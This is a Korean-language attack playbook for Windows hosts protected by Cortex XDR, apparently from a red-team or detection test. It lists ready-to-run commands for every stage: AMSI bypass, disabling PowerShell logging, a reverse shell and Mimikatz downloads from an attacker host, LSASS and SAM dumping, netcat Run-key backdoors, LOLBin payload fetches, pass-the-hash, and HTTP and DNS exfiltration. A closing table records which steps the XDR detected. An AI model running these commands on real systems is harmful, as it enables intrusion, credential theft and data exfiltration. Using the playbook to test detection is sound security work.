# Windows 공격 체인

> **환경**: Windows 10/11 · Cortex XDR 에이전트 설치  
> **목표**: 초기 접근 → 관리자 권한 획득 → 후속 공격 6개 브랜치 실행

---

## 🔗 공격 흐름 (Kill Chain)

```
[RECON]
  Nmap / SMB 열거
       │
       ▼
[INIT ACCESS]
  WinRM / SMB 인증
       │
       ▼
[AMSI BYPASS]
  PowerShell 탐지 우회
       │
       ▼
[EXECUTION]
  PowerShell 페이로드 실행
       │
       ▼
[CRED DUMP]
  Mimikatz / LSASS
       │
  ┌────┴────┬────────┬────────┬────────┬────────┐
  ▼         ▼        ▼        ▼        ▼        ▼
[TOKEN]  [PERSIST] [LOLBIN] [DATA]  [LATERAL] [EXFIL]
탈취     레지스트리  certutil  민감파일  PtH/PtT  cert/http
runas    서비스등록  bitsadmin 수집      내부이동  유출
```

---

## 📋 단계별 상세

### 1. 정찰 (Reconnaissance)
**MITRE**: T1595, T1046, T1135

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 1 | 포트 스캔 | `nmap -sV -p 445,3389,5985,5986 <target>` | 열린 포트 (SMB/WinRM/RDP) |
| 2 | SMB 열거 | `enum4linux -a <target>` | 공유 폴더, 사용자 목록 |
| 3 | NetBIOS 열거 | `nmap --script smb-enum-shares,smb-enum-users <target>` | 사용자/그룹 정보 |
| 4 | WinRM 확인 | `nmap -p 5985,5986 <target>` | WinRM 활성화 여부 |

---

### 2. 초기 접근 (Initial Access)
**MITRE**: T1021.006, T1110.001

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 5 | WinRM 브루트포스 | `crackmapexec winrm <target> -u users.txt -p pass.txt` | 유효 크레덴셜 |
| 6 | Evil-WinRM 접속 | `evil-winrm -i <target> -u administrator -p 'Password1!'` | WinRM 세션 |
| 7 | SMB 인증 | `smbclient //<target>/C$ -U administrator` | SMB 세션 |

---

### 3. AMSI 우회 (Defense Evasion)
**MITRE**: T1562.001

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 8 | AMSI 패치 (메모리) | `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` | 메모리 패치 |
| 9 | Script Block 로깅 비활성화 | `Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0` | 레지스트리 변경 |
| 10 | PowerShell Downgrade | `powershell -version 2 -c <payload>` | v2 실행 (AMSI 없음) |
| 11 | 인코딩 실행 | `powershell -EncodedCommand <base64>` | 인코딩된 페이로드 |

---

### 4. 실행 (Execution)
**MITRE**: T1059.001

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 12 | 리버스쉘 | `$client = New-Object System.Net.Sockets.TCPClient('<attacker>',4444)` | TCP 연결 |
| 13 | Invoke-Mimikatz 로드 | `IEX (New-Object Net.WebClient).DownloadString('http://<attacker>/Invoke-Mimikatz.ps1')` | 메모리 로드 |
| 14 | Shellcode Injection | `[Runtime.InteropServices.Marshal]::Copy($buf, 0, $mem, $buf.Length)` | 프로세스 인젝션 |

---

### 5. 자격증명 덤프 (Credential Dumping)
**MITRE**: T1003.001, T1003.002

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 15 | Mimikatz sekurlsa | `sekurlsa::logonpasswords` | NTLM 해시, 평문 패스워드 |
| 16 | LSASS 덤프 | `procdump.exe -accepteula -ma lsass.exe lsass.dmp` | lsass.dmp |
| 17 | SAM 덤프 | `reg save HKLM\SAM sam.hive` + `secretsdump.py` | NTLM 해시 |
| 18 | DCSync | `lsadump::dcsync /user:krbtgt` | krbtgt 해시 (도메인 환경) |

---

### 6-A. 토큰 탈취 / 권한 상승 (Privilege Escalation)
**MITRE**: T1134, T1548.002

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 19 | 토큰 열거 | `whoami /priv` + Mimikatz `token::list` | 가용 토큰 목록 |
| 20 | 토큰 Impersonation | `token::elevate /domainadmin` | SYSTEM/DA 권한 |
| 21 | UAC 우회 | `fodhelper.exe` 레지스트리 하이재킹 | Elevated 쉘 |
| 22 | PrintSpoofer | `PrintSpoofer.exe -i -c cmd` | SYSTEM 쉘 |

---

### 6-B. 지속성 (Persistence)
**MITRE**: T1547.001, T1543.003

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 23 | 레지스트리 Run 키 | `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /d "C:\Windows\Temp\nc.exe <ip> 4444 -e cmd"` | 레지스트리 키 |
| 24 | 서비스 등록 | `sc create BackdoorSvc binpath="C:\Windows\Temp\backdoor.exe"` | 서비스 목록 |
| 25 | 스케줄된 작업 | `schtasks /create /tn "Updater" /tr "C:\Temp\shell.exe" /sc minute /mo 5` | 스케줄 작업 목록 |
| 26 | WMI 이벤트 구독 | `Register-WMIEvent` 기반 지속성 | WMI 이벤트 |

---

### 6-C. LOLBin 악용 (Living off the Land)
**MITRE**: T1218, T1197

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 27 | certutil 다운로드 | `certutil -urlcache -split -f http://<attacker>/payload.exe C:\Temp\p.exe` | C:\Temp\p.exe |
| 28 | bitsadmin 다운로드 | `bitsadmin /transfer job http://<attacker>/file.exe C:\Temp\file.exe` | BITS 작업 |
| 29 | mshta.exe 실행 | `mshta.exe http://<attacker>/payload.hta` | 원격 HTA 실행 |
| 30 | regsvr32 실행 | `regsvr32 /s /n /u /i:http://<attacker>/payload.sct scrobj.dll` | Squiblydoo |

---

### 6-D. 데이터 수집 (Collection)
**MITRE**: T1005, T1552.001

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 31 | 하드코딩 크레덴셜 | `findstr /si "password" *.txt *.xml *.config` | 크레덴셜 파일 목록 |
| 32 | 브라우저 저장 패스워드 | `SharpDPAPI.exe triage` | 브라우저 크레덴셜 |
| 33 | 민감 파일 수집 | `robocopy C:\Users\ C:\Temp\loot /e /xf *.exe *.dll` | 수집된 파일 |

---

### 6-E. 내부망 이동 (Lateral Movement)
**MITRE**: T1550.002, T1021.002

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 34 | Pass-the-Hash | `crackmapexec smb <target> -u administrator -H <ntlm_hash>` | 인증 성공 로그 |
| 35 | PsExec | `psexec.py administrator@<target> -hashes :<ntlm>` | 원격 코드 실행 |
| 36 | WMI 원격 실행 | `wmic /node:<target> /user:admin /password:pass process call create "cmd.exe"` | 원격 프로세스 |

---

### 6-F. 데이터 유출 (Exfiltration)
**MITRE**: T1048.003

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 37 | HTTP 업로드 | `Invoke-RestMethod -Uri "http://<attacker>/upload" -Method POST -InFile C:\Temp\loot.zip` | HTTP 전송 |
| 38 | DNS 유출 | `nslookup $(certutil -encode secret.txt tmp && type tmp | tr -d "\n") <attacker_dns>` | DNS 쿼리 로그 |

---

## 🛡️ XDR 탐지 결과

| 공격 단계 | XDR 탐지 여부 | 탐지 규칙 |
|---------|------------|---------|
| WinRM 브루트포스 | ✅ 탐지 | Brute Force Attempt |
| AMSI 패치 | ✅ 탐지 | AMSI Bypass Attempt |
| PowerShell 다운로드 | ✅ 탐지 | Suspicious PowerShell |
| Mimikatz 실행 | ✅ 탐지 | Credential Dumping |
| LSASS 덤프 | ✅ 탐지 | LSASS Access |
| 레지스트리 Run 키 | ✅ 탐지 | Persistence |
| certutil 다운로드 | ⚠️ 부분 탐지 | LOLBin Activity |
| Pass-the-Hash | ✅ 탐지 | Lateral Movement |
